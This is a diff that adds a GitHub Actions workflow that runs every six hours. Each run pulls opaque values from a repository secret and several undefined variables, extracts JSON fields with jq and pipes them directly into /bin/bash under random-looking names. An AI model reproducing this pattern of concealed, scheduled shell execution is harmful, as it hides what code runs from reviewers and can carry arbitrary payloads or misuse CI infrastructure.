@@ -1,0 +1,21 @@
+name: linxuejiegong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: linxuejiegong
+        env:
+          py6451: ${{ secrets.py6451 }}
+        run: |
+          echo $py6451 | jq -r .ztifp27740 | /bin/bash
+          echo $djlf00305 | jq -r .u7 | /bin/bash
+          echo $uua3 | jq -r .igo6 | /bin/bash
+          echo $auf02007 | jq -r .py21474 | /bin/bash
+          echo $rollb8011 | jq -r .wt83793 | /bin/bash
+
